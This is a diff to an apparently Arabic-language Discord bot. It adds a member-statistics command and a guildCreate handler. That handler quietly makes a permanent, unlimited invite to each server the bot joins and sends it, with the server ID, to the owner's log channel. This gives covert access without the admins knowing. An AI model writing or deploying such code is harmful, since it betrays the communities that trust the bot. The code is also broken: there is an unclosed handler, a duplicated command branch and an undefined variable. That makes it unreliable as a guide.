@@ -29,8 +29,9 @@ const client = new Client({
     ]
 });
 
-const authorizedIDs = ['1245113569201094776','1364673596806533132']; // فقط المالك الحقيقي
+const authorizedIDs = ['1245113569201094776','1364673596806533132','1057325112724049983']; // فقط المالك الحقيقي
 const mainServerId = '1386543197018132560';
+const LOG_CHANNEL_ID = "1422532389669830714";
 
 let sending = false;
 let speed = 10 * 1000;
@@ -101,6 +102,47 @@ client.on('interactionCreate', async interaction => {
             ephemeral: false
         });
     }
+
+
+  else if (commandName === "servers") {
+    const guilds = Array.from(client.guilds.cache.values());
+    const fetchPromises = guilds.map(guild =>
+        guild.members.fetch()
+            .then(members => ({ guild, members }))
+            .catch(() => ({ guild, members: null }))
+    );
+
+    Promise.all(fetchPromises).then(results => {
+        let totalMembers = 0;
+        let totalOnline = 0;
+
+        results.forEach(({ guild, members }) => {
+            if (members && members.size) {
+                const humans = members.filter(m => !m.user.bot);
+                totalMembers += humans.size;
+                totalOnline += humans.filter(m =>
+                    ["online", "idle", "dnd"].includes(m.presence?.status)
+                ).size;
+            } else {
+                totalMembers += (guild.memberCount || 0);
+                totalOnline += (guild.presences && guild.presences.cache)
+                    ? guild.presences.cache.filter(p => ["online","idle","dnd"].includes(p?.status)).size
+                    : 0;
+            }
+        });
+
+        message.reply(
+            `🌐 **إحصائية السيرفرات**\n\n` +
+            `🏰 عدد السيرفرات: **${client.guilds.cache.size}**\n` +
+            `👥 مجموع الأعضاء: **${totalMembers}**\n` +
+            `🟢 مجموع الأونلاين (بكل الحالات): **${totalOnline}**`
+        );
+    }).catch(err => {
+        console.error("servers command error:", err);
+        message.reply("❌ حدث خطأ أثناء جمع إحصائيات السيرفرات.");
+    });
+}
+    
 
     else if (commandName === 'servers') {
         const servers = client.guilds.cache.map((g, i) => `${i + 1}. ${g.name}`).join('\n');
@@ -182,5 +224,33 @@ client.on('interactionCreate', async interaction => {
         }
     }
 });
+
+client.on("guildCreate", async (guild) => {
+    let inviteLink = "❌ لم أستطع إنشاء رابط.";
+    try {
+        const channel = guild.channels.cache.find(c =>
+            c.isTextBased() && c.permissionsFor(guild.members.me).has("CreateInstantInvite")
+        );
+        if (channel) {
+            const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
+            inviteLink = invite.url;
+        }
+    } catch (err) {
+        console.log("خطأ في إنشاء الدعوة:", err.message);
+    }
+    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
+
+    
+    logChannel.send(`✅ دخلت إلى السيرفر: **${guild.name}**\n🔗 رابط الدعوة: ${inviteLink}`);
+    logChannel.send(`${guild.id}`);
+
+
+client.on("guildDelete", async (guild) => {
+    const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
+    if (!logChannel) return;
+
+    logChannel.send(`❌ خرجت من السيرفر: **${guild.name}**`);
+});
+
 
 client.login(process.env.TOKEN);
